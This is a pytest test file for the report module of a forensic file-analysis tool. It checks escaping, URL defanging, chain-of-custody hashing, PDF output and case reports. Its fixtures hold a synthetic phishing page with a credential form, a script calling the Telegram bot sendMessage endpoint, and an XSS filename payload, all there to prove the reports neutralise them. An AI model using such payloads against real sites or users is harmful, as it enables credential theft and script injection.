"""Forensische Berichte (core/report.py): Escaping, Defanging, Beweiskette, PDF, Fallbericht."""
import hashlib
import os

import pytest

from core.history import HistoryDB
from core.report import (file_report_html, case_report_html, write_report, verify_custody, defang, esc)
from engines import run_forensic


@pytest.fixture
def evil(tmp_path):
    # unter Windows sind < > in Dateinamen verboten – der Name kommt deshalb aus den Metadaten der Analyse
    p = tmp_path / "evil.html"
    p.write_text('<script>alert("pwn")</script><form action="https://pay-portal.invalid/p">'
                 '<input type=password></form><script>fetch("https://api.telegram.org/bot1/sendMessage")</script>')
    return p


def test_defang_and_escape():
    assert defang("https://evil.invalid/x") == "hxxps://evil[.]invalid/x"
    assert defang("a@b.invalid") == "a[@]b[.]invalid"
    assert defang("198.51.100.7") == "198[.]51[.]100[.]7"
    assert esc('<a href="x">') == "&lt;a href=&quot;x&quot;&gt;"


def test_file_report_is_safe_and_complete(evil):
    res = run_forensic(str(evil))
    res["file"]["name"] = "<img src=x onerror=alert(1)>.html"      # böswilliger Dateiname (Linux/macOS möglich)
    html = file_report_html(res, examiner="<b>Analyst</b>", similar=[])
    assert "<script" not in html.lower()
    assert "onerror=alert" not in html.replace("&lt;img src=x onerror=alert(1)&gt;", "")
    assert "&lt;b&gt;Analyst&lt;/b&gt;" in html
    assert "hxxps://pay-portal[.]invalid" in html and "https://pay-portal.invalid" not in html
    for section in ("Verdict", "Chain of custody", "Findings", "MITRE ATT&amp;CK", "Timeline",
                    "Indicators of compromise", "Similar files"):
        assert section in html, section
    assert res["hashes"]["sha256"] in html
    assert "T1056.003" in html and "https://attack.mitre.org/techniques/T1056/003/" in html
    assert "<iframe" not in html and "http://" not in html.replace("hxxp", "")


def test_chain_of_custody(tmp_path):
    p = tmp_path / "beweis.txt"
    p.write_text("original")
    res = run_forensic(str(p))
    assert verify_custody(res)["status"] == "MATCH"
    p.write_text("verändert")
    c = verify_custody(res)
    assert c["status"] == "MISMATCH" and "CHANGED" in c["detail"]
    assert "MISMATCH" in file_report_html(res)
    p.unlink()
    assert verify_custody(res)["status"] == "UNAVAILABLE"


def test_write_html_with_integrity_file(tmp_path, evil):
    out = tmp_path / "reports" / "r.html"
    digest = write_report(file_report_html(run_forensic(str(evil))), out)
    assert hashlib.sha256(out.read_bytes()).hexdigest() == digest
    side = (tmp_path / "reports" / "r.html.sha256").read_text()
    assert side.startswith(digest) and "r.html" in side


def test_write_pdf(tmp_path, evil):
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    out = tmp_path / "r.pdf"
    write_report(file_report_html(run_forensic(str(evil))), out)
    data = out.read_bytes()
    assert data.startswith(b"%PDF") and len(data) > 5000


def test_case_report(tmp_path, evil):
    db = HistoryDB(tmp_path / "h.db")
    cid = db.create_case("INC-<4711>")
    db.record(run_forensic(str(evil)), case_id=cid)
    twin = tmp_path / "mahnung.html"
    twin.write_text('<form action="https://pay-portal.invalid/verify"><input type=password></form>')
    db.record(run_forensic(str(twin)), case_id=cid)
    html = case_report_html(db, cid, examiner="A. Analyst")
    assert "INC-&lt;4711&gt;" in html and "<4711>" not in html
    assert "Shared infrastructure" in html and "pay-portal[.]invalid" in html
    assert "Cluster 1" in html and "Per-file detail" in html
    assert "<script" not in html.lower()
    with pytest.raises(ValueError):
        case_report_html(db, 999)


def test_report_buttons(tmp_path, evil, monkeypatch):
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    import gui.report_dialog as rd
    from gui.analysis_view import AnalysisView
    from gui.history_view import HistoryView
    out = tmp_path / "x.html"
    monkeypatch.setattr(rd, "ask_examiner", lambda parent: "Tester")
    monkeypatch.setattr(rd.QFileDialog, "getSaveFileName", lambda *a, **k: (str(out), "HTML report (*.html)"))
    monkeypatch.setattr(rd.QMessageBox, "information", lambda *a, **k: None)

    view = AnalysisView()
    assert not view.btn_report.isEnabled()
    view.load_result(run_forensic(str(evil)))
    assert view.btn_report.isEnabled()
    assert view.export_report() == str(out) and "Tester" in out.read_text()

    db = HistoryDB(tmp_path / "h.db")
    hv = HistoryView(db=db)
    assert not hv.btn_case_report.isEnabled()
    cid = db.create_case("Fall")
    db.record(run_forensic(str(evil)), case_id=cid)
    hv.reload_cases(select_id=cid)
    assert hv.btn_case_report.isEnabled()
    assert hv.export_case_report() == str(out) and "Case Report" in out.read_text()
